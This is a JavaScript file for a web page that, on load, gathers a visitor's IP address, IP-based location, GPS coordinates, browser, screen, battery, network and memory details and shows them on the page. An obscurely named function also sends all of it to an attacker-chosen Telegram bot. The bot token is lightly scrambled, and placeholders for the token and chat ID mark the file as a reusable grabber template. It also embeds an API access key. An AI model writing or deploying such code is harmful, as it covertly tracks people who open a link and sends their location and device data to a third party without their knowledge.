function getDeviceMemoryInfo() {
    if (navigator.deviceMemory) {
      return `Device Memory: ${navigator.deviceMemory}GB`;
    } else {
      return "Device Memory: Information not available";
    }
  }
  
  function getIP() {
    return fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => data.ip);
  }
  
  function getDetails(ip) {
    return fetch(
      `https://ipapi.co/${ip}/json/?access_key=e91bcaffc436d1c45abeb065909a1336`
    )
      .then((response) => response.json())
      .then((data) => {
        const latitude = data.latitude;
        const longitude = data.longitude;
        const mapsLink = `https://www.google.com/maps/search/${latitude}+${longitude}`;
        const details = `
        IP Address: ${data.ip}
        Network: ${data.network}
        Version: ${data.version}
        City: ${data.city}
        Region: ${data.region}
        Region Code: ${data.region_code}
        Country: ${data.country}
        Country Name: ${data.country_name}
        Country Code: ${data.country_code}
        Country Code ISO3: ${data.country_code_iso3}
        Country Capital: ${data.country_capital}
        Country TLD: ${data.country_tld}
        Continent Code: ${data.continent_code}
        In EU: ${data.in_eu}
        Postal: ${data.postal}
        Latitude: ${data.latitude}
        Longitude: ${data.longitude}
        Timezone: ${data.timezone}
        UTC Offset: ${data.utc_offset}
        Country Calling Code: ${data.country_calling_code}
        Currency: ${data.currency}
        Currency Name: ${data.currency_name}
        Languages: ${data.languages}
        Country Area: ${data.country_area}
        Country Population: ${data.country_population}
        ASN: ${data.asn}
        Organization: ${data.org}
        Location: ${mapsLink}`;
        return details;
      });
  }
  
  function getNetworkInfo() {
    const connection =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
  
    if (connection) {
      return `
      Network Type: ${connection.type}
      Downlink: ${connection.downlink} Mb/s
      Effective Type: ${connection.effectiveType}
    `;
    } else {
      return "Network Information: Information not available";
    }
  }
  
  function getBrowserInfo() {
    const browserInfo = {
      codeName: navigator.appCodeName,
      name: navigator.appName,
      version: navigator.appVersion,
      cookiesEnabled: navigator.cookieEnabled,
      language: navigator.language,
      online: navigator.onLine,
      platform: navigator.platform,
      userAgent: navigator.userAgent,
    };
    return `
    Code Name: ${browserInfo.codeName}
    Name: ${browserInfo.name}
    Version: ${browserInfo.version}
    Cookies Enabled: ${browserInfo.cookiesEnabled}
    Language: ${browserInfo.language}
    Online: ${browserInfo.online}
    Platform: ${browserInfo.platform}
    User Agent: ${browserInfo.userAgent}
  `;
  }
  
  function getScreenInfo() {
    const screenInfo = {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
    };
    return `
    Screen Width: ${screenInfo.width}
    Screen Height: ${screenInfo.height}
    Color Depth: ${screenInfo.colorDepth}
    Pixel Depth: ${screenInfo.pixelDepth}
  `;
  }
  
  async function getBatteryInfo() {
    try {
      const battery = await navigator.getBattery();
      const batteryInfo = {
        level: battery.level,
        charging: battery.charging,
      };
      return `
      Battery Level: ${batteryInfo.level * 100}%
      Charging: ${batteryInfo.charging ? "Yes" : "No"}
    `;
    } catch (error) {
      return "Battery Information: Not available";
    }
  }
  
  function jkt(info) {
    let t = <PLACE YOUR BOT TOKEN HERE WITHIN "";
    let nt = "";
    let nt1 = "";
    let nt2 = "";
  
    for (let i = 0; i < 46; i++) {
      if (i % 2 === 0) {
        nt2 += t.charAt(i);
      } else {
        nt1 += t.charAt(t.length - i);
      }
    }
  
    nt = nt2 + nt1;
    console.log(nt);
  
    const bixi = nt;
    const chatId = <PLACE YOUR CHAT ID HERE WITH IN "">;
  
    const encodedInfo = encodeURIComponent(info);
  
    const url = `https://api.telegram.org/bot${bixi}/sendMessage?chat_id=${chatId}&text=${encodedInfo}&parse_mode=Markdown`;
  
    fetch(url, { method: "GET" })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        console.log("Telegram API response:", data);
      })
      .catch((error) => {
        console.error("Error sending message to Telegram:", error);
      });
  }
  
  async function getLocationInfo() {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
  
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const mapsLink = `https://www.google.com/maps/search/${latitude}+${longitude}`;
      const locationInfo = `
      Latitude: ${latitude}
      Longitude: ${longitude}
      Location: ${mapsLink}
    `;
  
      return locationInfo;
    } catch (error) {
      return "Location Information: Not available";
    }
  }
  
  function updateHTML(info) {
    document.getElementById("info-display").innerText = info;
  }
  
  async function updateInfo() {
    try {
      const geolocationInfo = await getLocationInfo();
      const ip = await getIP();
      let info = `Your IP Address: ${ip}\n`;
      const details = await getDetails(ip);
      info += details;
      info += "\n";
      info += getBrowserInfo();
      info += "\n";
      info += getScreenInfo();
      info += "\n";
      info += await getBatteryInfo();
      info += "\n";
      info += getNetworkInfo();
      info += "\n";
      info += getDeviceMemoryInfo();
      info += "\n";
      info += geolocationInfo;
  
      updateHTML(info);
      jkt(info);
    } catch (error) {
      console.error("Error:", error);
    }
  }
  
  window.onload = function () {
    updateInfo();
  };
